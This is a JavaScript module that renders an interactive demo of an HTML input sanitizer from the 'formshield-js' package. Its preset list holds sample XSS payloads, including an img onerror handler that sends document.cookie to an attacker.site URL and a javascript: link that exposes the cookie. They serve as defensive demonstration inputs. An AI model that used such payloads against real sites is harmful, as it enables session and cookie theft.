import { icons } from '../utils/icons.js';
import { copyToClipboard } from '../utils/copy.js';
import { sanitizeInput } from 'formshield-js';

export function renderInputSanitizer() {
  return `
    <div class="view-content tool-view">
      <!-- Tool View Header -->
      <div class="tool-view-header">
        <div class="tool-title-row">
          <div class="tool-icon-badge">${icons.sanitize}</div>
          <div>
            <h1 class="tool-page-title">HTML Input Sanitizer</h1>
            <p class="tool-page-desc">Deterministic HTML special character entity escaping via <code class="inline-code">sanitizeInput</code></p>
          </div>
        </div>
        <div class="tool-meta-tags">
          <span class="tag-pill">Package Export: sanitizeInput</span>
          <span class="tag-pill tag-pill-accent">XSS Defense</span>
        </div>
      </div>

      <!-- Presets Toolbar -->
      <div class="card presets-card">
        <div class="presets-toolbar-row">
          <span class="presets-label">Attack Vectors &amp; Markup Presets:</span>
          <div class="presets-pills">
            <button class="preset-pill" data-preset="script">
              <span class="preset-pill-dot danger"></span>
              <span>&lt;script&gt; Tag Injection</span>
            </button>
            <button class="preset-pill" data-preset="img">
              <span class="preset-pill-dot danger"></span>
              <span>&lt;img onerror&gt; Event</span>
            </button>
            <button class="preset-pill" data-preset="link">
              <span class="preset-pill-dot danger"></span>
              <span>javascript: Pseudo-protocol</span>
            </button>
            <button class="preset-pill" data-preset="quotes">
              <span class="preset-pill-dot warning"></span>
              <span>Quotes &amp; Ampersands</span>
            </button>
            <button class="preset-pill" data-preset="safe">
              <span class="preset-pill-dot safe"></span>
              <span>Clean Plain Text</span>
            </button>
          </div>
        </div>
      </div>

      <!-- Side-by-Side Comparative Workbench Grid -->
      <div class="workbench-grid-comparative">
        <!-- Original Raw Input Column -->
        <div class="comparative-col">
          <div class="card card-interactive h-full">
            <div class="card-header-bar">
              <div class="card-title-group">
                <span class="card-title">Original Raw Input</span>
                <span class="tag-pill tag-pill-warn" id="sanitizerRawStatus">Unsanitized</span>
              </div>
              <button class="btn btn-sm btn-ghost" id="sanitizerClearBtn" title="Clear input">
                ${icons.x}
                <span>Clear</span>
              </button>
            </div>

            <div class="form-group flex-1">
              <textarea
                id="sanitizerInput"
                class="form-textarea"
                rows="7"
                placeholder="Type or paste raw user input containing HTML, scripts, or quotes..."
                spellcheck="false"
              >&lt;script&gt;alert("XSS Vulnerability Detected!")&lt;/script&gt;</textarea>
            </div>

            <div class="input-stats-row">
              <span class="input-char-stat" id="sanitizerInputLength">0 characters</span>
              <span class="input-stat-note">Raw string passed to sanitizeInput()</span>
            </div>
          </div>
        </div>

        <!-- Sanitized Safe Output Column -->
        <div class="comparative-col">
          <div class="card card-highlight h-full">
            <div class="card-header-bar">
              <div class="card-title-group">
                <span class="card-title">Sanitized Safe Output</span>
                <span class="status-pill" id="sanitizerModifiedBadge">wasModified: true</span>
              </div>
              <button class="btn btn-sm btn-secondary" id="sanitizerCopyOutputBtn">
                ${icons.copy}
                <span>Copy Safe Output</span>
              </button>
            </div>

            <div class="sanitized-output-box flex-1">
              <pre class="sanitized-text" id="sanitizerOutputText"><code>...</code></pre>
            </div>

            <div class="input-stats-row">
              <span class="input-char-stat" id="sanitizerOutputLength">0 characters</span>
              <span class="input-stat-note" id="sanitizerDiffStat">Escaped entities</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Entity Substitution Reference & Live Render Demo -->
      <div class="workbench-grid">
        <!-- Character Replacement Matrix -->
        <div class="workbench-col">
          <div class="card">
            <div class="card-header-bar">
              <span class="card-title">HTML Character Escaping Matrix</span>
              <span class="card-subtitle-badge">6 Replacements</span>
            </div>
            <div class="matrix-table-wrap">
              <table class="matrix-table">
                <thead>
                  <tr>
                    <th>Character</th>
                    <th>Name</th>
                    <th>Safe HTML Entity</th>
                    <th>Count in Input</th>
                  </tr>
                </thead>
                <tbody id="sanitizerMatrixBody">
                  <!-- Populated dynamically -->
                </tbody>
              </table>
            </div>
          </div>

          <!-- JavaScript Code Example -->
          <div class="card card-code">
            <div class="card-header-bar">
              <div class="code-header-title">
                ${icons.terminal}
                <span>JavaScript Code Snippet</span>
              </div>
              <button class="btn btn-sm btn-ghost" id="sanitizerCopyCodeBtn">
                ${icons.copy}
                <span>Copy</span>
              </button>
            </div>
            <pre class="code-block" id="sanitizerCodeBlock"><code>...</code></pre>
          </div>
        </div>

        <!-- Right Col: Browser DOM Render Preview & Inspector -->
        <div class="workbench-col">
          <!-- Live Browser Render Comparison -->
          <div class="card">
            <div class="card-header-bar">
              <span class="card-title">Browser DOM Safety Demonstration</span>
              <span class="tag-pill tag-pill-accent">SAFE EXECUTION</span>
            </div>
            <div class="safety-demo-box">
              <div class="demo-subheading">When inserted into standard DOM:</div>
              <div class="demo-display-panel" id="sanitizerDemoDOM">
                <!-- Rendered as safe text -->
              </div>
              <div class="demo-explanation">
                ${icons.info}
                <span>Because tags are converted to entities, browsers treat this exclusively as harmless text content, neutralizing HTML tag injection and script execution.</span>
              </div>
            </div>
          </div>

          <!-- Raw Return JSON Inspector -->
          <div class="card">
            <div class="card-header-bar">
              <div class="json-header-title">
                <span class="pulse-dot"></span>
                <span>Actual Return Value (<code class="inline-code">sanitizeInput()</code>)</span>
              </div>
              <span class="tag-pill tag-pill-accent">REAL OBJECT</span>
            </div>
            <pre class="json-display" id="sanitizerJsonDisplay"><code class="language-json">...</code></pre>
          </div>
        </div>
      </div>
    </div>
  `;
}

export function initInputSanitizer(container) {
  const inputEl = container.querySelector('#sanitizerInput');
  const clearBtn = container.querySelector('#sanitizerClearBtn');
  const rawStatus = container.querySelector('#sanitizerRawStatus');
  const inputLength = container.querySelector('#sanitizerInputLength');

  const modifiedBadge = container.querySelector('#sanitizerModifiedBadge');
  const outputText = container.querySelector('#sanitizerOutputText code');
  const outputLength = container.querySelector('#sanitizerOutputLength');
  const diffStat = container.querySelector('#sanitizerDiffStat');
  const copyOutputBtn = container.querySelector('#sanitizerCopyOutputBtn');

  const matrixBody = container.querySelector('#sanitizerMatrixBody');
  const demoDOM = container.querySelector('#sanitizerDemoDOM');

  const jsonDisplay = container.querySelector('#sanitizerJsonDisplay code');
  const codeBlock = container.querySelector('#sanitizerCodeBlock code');
  const copyCodeBtn = container.querySelector('#sanitizerCopyCodeBtn');

  const presetsMap = {
    script: '<script>alert("XSS Vulnerability Detected!")</script>',
    img: '<img src="invalid-image.jpg" onerror="fetch(\'https://attacker.site/steal?cookie=\' + document.cookie)" />',
    link: '<a href="javascript:alert(\'Cookie:\' + document.cookie)">Click to claim free prize!</a>',
    quotes: `Tom & Jerry's "Wild Adventure" — Rated 5 / 5 stars by <critics>!`,
    safe: 'FormShield is a zero-dependency form validation toolkit.'
  };

  const escapeTable = [
    { char: '&', name: 'Ampersand', entity: '&amp;', regex: /&/g },
    { char: '<', name: 'Less-than', entity: '&lt;', regex: /</g },
    { char: '>', name: 'Greater-than', entity: '&gt;', regex: />/g },
    { char: '"', name: 'Double quote', entity: '&quot;', regex: /"/g },
    { char: "'", name: 'Single quote', entity: '&#39;', regex: /'/g },
    { char: '/', name: 'Forward slash', entity: '&#x2F;', regex: /\//g }
  ];

  function update() {
    const rawVal = inputEl.value;

    inputLength.textContent = `${rawVal.length} characters`;

    // 1. Invoke REAL package function
    const result = sanitizeInput(rawVal);

    // 2. Update Output display
    outputText.textContent = result.sanitized;
    outputLength.textContent = `${result.sanitized.length} characters`;

    if (result.wasModified) {
      modifiedBadge.className = 'status-pill status-pill-modified';
      modifiedBadge.innerHTML = `<span class="pill-dot warning"></span> wasModified: true (Escaped)`;
      rawStatus.className = 'tag-pill tag-pill-danger';
      rawStatus.textContent = 'Contains Raw HTML';
      diffStat.textContent = `Expanded by +${result.sanitized.length - rawVal.length} characters via entity codes`;
    } else {
      modifiedBadge.className = 'status-pill status-pill-clean';
      modifiedBadge.innerHTML = `<span class="pill-dot valid"></span> wasModified: false (Clean)`;
      rawStatus.className = 'tag-pill tag-pill-success';
      rawStatus.textContent = 'Clean String';
      diffStat.textContent = 'Zero HTML control characters detected';
    }

    // 3. Update Character Replacement Matrix
    matrixBody.innerHTML = escapeTable.map(item => {
      const matches = rawVal.match(item.regex);
      const count = matches ? matches.length : 0;
      return `
        <tr class="${count > 0 ? 'matrix-row-active' : ''}">
          <td><code class="matrix-char">${escapeHtml(item.char)}</code></td>
          <td>${item.name}</td>
          <td><code class="matrix-entity">${item.entity}</code></td>
          <td>
            <span class="matrix-count ${count > 0 ? 'count-active' : 'count-zero'}">
              ${count}
            </span>
          </td>
        </tr>
      `;
    }).join('');

    // 4. Update Safety DOM Demo
    // Notice: we display textContent safely so no scripts run!
    demoDOM.textContent = result.sanitized;

    // 5. Update Raw JSON
    jsonDisplay.textContent = JSON.stringify(result, null, 2);

    // 6. Update Code Snippet
    const codeSnippet = `import { sanitizeInput } from 'formshield-js';

const result = sanitizeInput('${escapeJsString(rawVal)}');

console.log(result.sanitized);
// => "${escapeJsString(result.sanitized)}"

console.log(result.wasModified);
// => ${result.wasModified}`;
    codeBlock.textContent = codeSnippet;
  }

  // Event Listeners
  inputEl.addEventListener('input', update);

  clearBtn.addEventListener('click', () => {
    inputEl.value = '';
    inputEl.focus();
    update();
  });

  container.querySelectorAll('.preset-pill').forEach(btn => {
    btn.addEventListener('click', () => {
      const key = btn.getAttribute('data-preset');
      if (presetsMap[key]) {
        inputEl.value = presetsMap[key];
        update();
      }
    });
  });

  copyOutputBtn.addEventListener('click', () => {
    const text = outputText.textContent;
    copyToClipboard(text, copyOutputBtn, 'Sanitized output copied!');
  });

  copyCodeBtn.addEventListener('click', () => {
    copyToClipboard(codeBlock.textContent, copyCodeBtn, 'Sanitizer code snippet copied!');
  });

  update();
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function escapeJsString(str) {
  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\n/g, '\\n');
}
